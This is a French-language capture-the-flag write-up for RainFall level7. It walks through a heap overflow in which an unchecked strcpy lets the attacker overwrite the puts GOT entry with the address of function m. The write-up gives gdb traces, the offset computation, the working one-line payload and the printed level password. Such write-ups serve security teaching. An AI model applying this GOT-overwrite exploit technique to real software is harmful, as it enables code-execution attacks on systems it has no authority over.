# Solution

```
./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

## Description du code

En observant le code source on peu constater que des pointeur on ete malloc et ensuite strcpy est utiliser sans verifier la taille de ce qui est copier.
La fonction m affiche une variable global c dans laquel le .pass est stocker apres l'appel de fgets.
On va donc pouvoir cree un overflow et utiliser une vulnérabilité.

## Test

--------------------------------------
Quelque test :
```
test1 :
level7@RainFall:~$ ./level7 AAA aaa
~~

test2 :
level7@RainFall:~$ ./level7 $(python -c 'print("A" * 200)') $(python -c 'print("BBB")')
Segmentation fault (core dumped)

test3 :
level7@RainFall:~$ ./level7 $(python -c 'print("A")') $(python -c 'print("BBB" * 200)')
~~

test4 :
level7@RainFall:~$ ./level7 $(python -c 'print("A")') $(python -c 'print("BBB" * 20000)')
~~
```
--------------------------------------
Analyse des registre :

Apres les test on peu voir que seulement av[1] overflow sur des donnée critique.
On va analiser les registres lors de l'overflow :
```
level7@RainFall:~$ gdb ./level7
(gdb) run $(python -c 'print("A" * 200)') $(python -c 'print("BBB")')
Starting program: /home/user/level7/level7 $(python -c 'print("A" * 200)') $(python -c 'print("BBB")')

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8f42 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) 

(gdb) info register
eax            0x424242	4342338
ecx            0xbffff909	-1073743607
edx            0x41414141	1094795585
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff63c	0xbffff63c
ebp            0xbffff668	0xbffff668
esi            0x0	0
edi            0x0	0
eip            0xb7eb8f42	0xb7eb8f42
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

(gdb) disassemble main
Vue sur l'appel du deuxieme strcpy
(...)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
(...)
```
eax contient notre av[2] et notre overflow a ecrasé eax, et que l'on ecrase pas eip.
On peu en conclure ceci :

- eip ne sera pas utile cette fois ci pas de ret to libc 
- edx est ecrasé et sert contient l'argument 1 du second strcpy
- eax lui contient l'argument numero 2 du second strcpy

--------------------------------------

## Description de l'exploit

On va pouvoir utiliser une vulnerabilité appeler "heap overflow".
Le principe sera d'ecraser l'argument 1 du second strcpy par l'adresse de puts, et de mettre l'adresse de m dans le second argument, 
afin que l'adresse de m sois copier dans l'adresse de puts ce qui va permettre de lancer m a la place de puts.
Comme puts est une fonction de la libc il faudra recuper don adresse dans la GOT.

-----------------
D'abord recuperons le critical offset lorsque l'on ecrase edx :

(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A BBBB
Starting program: /home/user/level7/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A BBBB

Breakpoint 1, 0x08048524 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8f52 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) info register
eax            0x42424242	1111638594
ecx            0xbffff908	-1073743608
edx            0x37614136	929120566
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff69c	0xbffff69c
ebp            0xbffff6c8	0xbffff6c8
esi            0x0	0
edi            0x0	0
eip            0xb7eb8f52	0xb7eb8f52
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51


0x37614136 -> ASCII + REVERSE -> 6Aa7

6Aa7 = 20 

-----------------

Adresse de m :
```
(gdb) p &m
$1 = (<text variable, no debug info> *) 0x80484f4 <m>
```
-----------------

AGOT adresse de puts :

```
(gdb) info function puts
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
0xb7e911a0  _IO_fputs
0xb7e911a0  fputs
0xb7e927e0  _IO_puts
0xb7e927e0  puts
0xb7e96ee0  fputs_unlocked
0xb7f20750  putspent
0xb7f21fa0  putsgent

(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:	jmp    *0x8049928
```
-----------------
## Payload

GOT adress of puts : 0x08049928
Adress of m : 0x080484f4
Critical Offset : 20
```
level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')

5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1713690987
```